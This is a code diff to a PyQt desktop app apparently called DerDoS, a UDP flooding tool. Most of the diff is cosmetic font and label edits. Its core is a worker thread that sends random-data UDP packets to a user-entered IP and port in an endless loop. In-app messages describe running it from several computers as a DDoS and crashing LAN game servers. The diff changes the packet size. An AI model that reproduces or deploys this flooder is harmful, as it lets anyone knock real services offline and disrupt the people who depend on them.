@@ -36,7 +36,7 @@ class Ui_MainWindow(object):
         self.attack.setObjectName("attack")
         self.label = QtWidgets.QLabel(self.centralwidget)
         self.label.setGeometry(QtCore.QRect(10, 230, 141, 21))
-        self.label.setStyleSheet("font: 300 10pt \"Sukhumvit Set\";")
+        self.label.setStyleSheet("font: 300 10pt \"Arial\";")  # Changed font to Arial
         self.label.setAlignment(QtCore.Qt.AlignCenter)
         self.label.setObjectName("label")
         self.progressBar = QtWidgets.QProgressBar(self.centralwidget)
@@ -53,7 +53,7 @@ class Ui_MainWindow(object):
         self.verticalLayout_3 = QtWidgets.QVBoxLayout()
         self.verticalLayout_3.setObjectName("verticalLayout_3")
         self.title_ip = QtWidgets.QLabel(self.layoutWidget)
-        self.title_ip.setStyleSheet("font: 500 18pt \"Sukhumvit Set\";")
+        self.title_ip.setStyleSheet("font: 500 18pt \"Arial\";")
         self.title_ip.setObjectName("title_ip")
         self.verticalLayout_3.addWidget(self.title_ip)
         self.ip = QtWidgets.QLineEdit(self.layoutWidget)
@@ -63,7 +63,7 @@ class Ui_MainWindow(object):
         self.verticalLayout = QtWidgets.QVBoxLayout()
         self.verticalLayout.setObjectName("verticalLayout")
         self.title_port = QtWidgets.QLabel(self.layoutWidget)
-        self.title_port.setStyleSheet("font: 500 18pt \"Sukhumvit Set\";")
+        self.title_port.setStyleSheet("font: 500 18pt \"Arial\";")
         self.title_port.setObjectName("title_port")
         self.verticalLayout.addWidget(self.title_port)
         self.port = QtWidgets.QLineEdit(self.layoutWidget)
@@ -88,24 +88,24 @@ class Ui_MainWindow(object):
     def retranslateUi(self, MainWindow):
         _translate = QtCore.QCoreApplication.translate
         self.attack.setText(_translate("MainWindow", "Attack"))
-        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS">Made by atomic09</a>'))
+        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">V1.0 | Made by atomic09</a>'))
         self.label.setOpenExternalLinks(True)
         self.title_ip.setText(_translate("MainWindow", "IP Address"))
         self.title_port.setText(_translate("MainWindow", "Port"))
-        self.actionMade_by_atomic09.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS">Made by atomic09</a>'))
+        self.actionMade_by_atomic09.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">V1.0 | Made by atomic09</a>'))
         
     def shoot(self):
-            target_ip = str(self.ip.text())
-            target_port = int(self.port.text())
-            self.target_ip_global = target_ip
-            self.target_port_global = target_port
-            self.plainTextEdit.appendPlainText(f"Attacking to {target_ip} with port {target_port}\n")
-            self.plainTextEdit.appendPlainText(("1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on multiple computers, it's called DDoS.\n4.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n"))
-            QtTest.QTest.qWait(5000)
-            self.plainTextEdit.appendPlainText(('Hint: Please check "Send" on Network Adapter in Task Manager\n'))
-            self.plainTextEdit.appendPlainText(('How to stop attacking ?, Just exit the program :)'))
-            self.ip.setReadOnly(True)
-            self.port.setReadOnly(True)
+        target_ip = str(self.ip.text())
+        target_port = int(self.port.text())
+        self.target_ip_global = target_ip
+        self.target_port_global = target_port
+        self.plainTextEdit.appendPlainText(f"Attacking to {target_ip} with port {target_port}\n")
+        self.plainTextEdit.appendPlainText(("1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on multiple computers, it's called DDoS.\n4.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n"))
+        QtTest.QTest.qWait(5000)
+        self.plainTextEdit.appendPlainText(('Hint: Please check "Send" on Network Adapter in Task Manager\n'))
+        self.plainTextEdit.appendPlainText(('How to stop attacking ?, Just exit the program :)'))
+        self.ip.setReadOnly(True)
+        self.port.setReadOnly(True)
 
     def delay(self,x):
         if x <= 100:
@@ -122,7 +122,7 @@ class Ui_MainWindow(object):
 class WorkerThread(QtCore.QThread):
     def run(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        data = os.urandom(65507)
+        data = os.urandom(9216)
         while True:
             s.sendto(data, (self.target_ip, self.target_port))
 
